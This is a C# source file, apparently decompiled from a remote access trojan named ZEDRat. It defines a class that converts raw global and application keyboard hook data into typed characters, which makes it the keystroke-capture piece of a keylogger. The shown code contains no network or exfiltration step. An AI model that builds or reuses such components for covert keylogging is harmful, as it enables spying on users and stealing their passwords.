using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using ZEDRatApp.ZEDRAT.MouseKeyHook.WinApi;

namespace ZEDRatApp.ZEDRAT.MouseKeyHook
{
	public class KeyPressEventArgsExt : KeyPressEventArgs
	{
		public bool IsNonChar { get; private set; }

		public int Timestamp { get; private set; }

		internal KeyPressEventArgsExt(char keyChar, int timestamp)
			: base(keyChar)
		{
			this.IsNonChar = keyChar == '\0';
			this.Timestamp = timestamp;
		}

		public KeyPressEventArgsExt(char keyChar)
			: this(keyChar, Environment.TickCount)
		{
		}

		internal static IEnumerable<KeyPressEventArgsExt> FromRawDataApp(CallbackData data)
		{
			IntPtr wParam = data.WParam;
			uint num = (uint)data.LParam.ToInt64();
			bool flag = (num & 0x40000000) != 0;
			bool flag2 = (num & 0x80000000u) != 0;
			if (!flag && !flag2)
			{
				yield break;
			}
			KeyboardNativeMethods.TryGetCharFromKeyboardState((int)wParam, checked((int)(num & 0xFF0000u)), 0, out var chars);
			if (chars != null)
			{
				char[] array = chars;
				for (int i = 0; i < array.Length; i++)
				{
					yield return new KeyPressEventArgsExt(array[i]);
				}
			}
		}

		internal static IEnumerable<KeyPressEventArgsExt> FromRawDataGlobal(CallbackData data)
		{
			IntPtr wParam = data.WParam;
			IntPtr lParam = data.LParam;
			if ((int)wParam != 256)
			{
				yield break;
			}
			KeyboardHookStruct keyboardHookStruct = (KeyboardHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyboardHookStruct));
			int virtualKeyCode = keyboardHookStruct.VirtualKeyCode;
			int scanCode = keyboardHookStruct.ScanCode;
			int flags = keyboardHookStruct.Flags;
			if (virtualKeyCode == 231)
			{
				yield return new KeyPressEventArgsExt((char)scanCode, keyboardHookStruct.Time);
				yield break;
			}
			KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, flags, out var chars);
			if (chars != null)
			{
				char[] array = chars;
				for (int i = 0; i < array.Length; i++)
				{
					yield return new KeyPressEventArgsExt(array[i], keyboardHookStruct.Time);
				}
			}
		}
	}
}
